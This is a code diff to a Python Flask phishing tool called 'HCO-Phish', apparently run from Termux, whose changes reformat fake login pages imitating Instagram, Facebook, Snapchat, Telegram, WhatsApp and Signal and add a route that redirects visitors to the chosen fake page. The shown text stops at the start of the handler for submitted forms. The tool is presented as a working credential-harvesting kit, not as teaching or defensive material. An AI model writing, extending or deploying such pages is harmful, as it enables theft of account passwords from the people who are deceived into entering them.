@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# HCO-Phish v6 – Ultra-Realistic Version
+# HCO-Phish v7 – Full Working Version
 # Single-file Termux Tool
 
 import os, sys, time, subprocess, threading, webbrowser, shutil
@@ -65,8 +65,7 @@ app = Flask(__name__)
 
 # ------------------ HTML Templates ------------------ #
 templates = {
-"Instagram": """
-<html><head><title>Instagram</title>
+"Instagram": """<html><head><title>Instagram</title>
 <style>
 body{background:#fafafa;font-family:Arial;text-align:center;}
 .login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
@@ -90,10 +89,8 @@ img{width:120px;margin-bottom:20px;}
 <button type="submit">Log In</button>
 </form>
 </div>
-</body></html>
-""",
-"Facebook": """
-<html><head><title>Facebook</title>
+</body></html>""",
+"Facebook": """<html><head><title>Facebook</title>
 <style>
 body{background:#e9ebee;font-family:Arial;text-align:center;}
 .login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
@@ -117,10 +114,8 @@ img{width:120px;margin-bottom:20px;}
 <button type="submit">Log In</button>
 </form>
 </div>
-</body></html>
-""",
-"Snapchat": """
-<html><head><title>Snapchat</title>
+</body></html>""",
+"Snapchat": """<html><head><title>Snapchat</title>
 <style>
 body{background:#fffc00;font-family:Arial;text-align:center;}
 .login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
@@ -143,10 +138,8 @@ button{padding:10px 20px;background:#fffc00;color:#000;border:none;border-radius
 <button type="submit">Log In</button>
 </form>
 </div>
-</body></html>
-""",
-"Telegram": """
-<html><head><title>Telegram</title>
+</body></html>""",
+"Telegram": """<html><head><title>Telegram</title>
 <style>
 body{background:#0088cc;font-family:Arial;text-align:center;}
 .login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
@@ -169,10 +162,8 @@ button{padding:10px 20px;background:#0088cc;color:white;border:none;border-radiu
 <button type="submit">Log In</button>
 </form>
 </div>
-</body></html>
-""",
-"WhatsApp": """
-<html><head><title>WhatsApp</title>
+</body></html>""",
+"WhatsApp": """<html><head><title>WhatsApp</title>
 <style>
 body{background:#25d366;font-family:Arial;text-align:center;}
 .login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
@@ -195,10 +186,8 @@ button{padding:10px 20px;background:#25d366;color:white;border:none;border-radiu
 <button type="submit">Log In</button>
 </form>
 </div>
-</body></html>
-""",
-"Signal": """
-<html><head><title>Signal</title>
+</body></html>""",
+"Signal": """<html><head><title>Signal</title>
 <style>
 body{background:#3a76f0;font-family:Arial;text-align:center;}
 .login-box{background:white;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);}
@@ -221,11 +210,14 @@ button{padding:10px 20px;background:#3a76f0;color:white;border:none;border-radiu
 <button type="submit">Log In</button>
 </form>
 </div>
-</body></html>
-"""
+</body></html>"""
 }
 
-# ------------------ Flask Route ------------------ #
+# ------------------ Flask Routes ------------------ #
+@app.route("/")
+def home_redirect():
+    return f"<script>window.location='/simulate/{selected_service.lower()}'</script>"
+
 @app.route(f"/simulate/{selected_service.lower()}", methods=["GET","POST"])
 def service_page():
     if request.method=="POST":
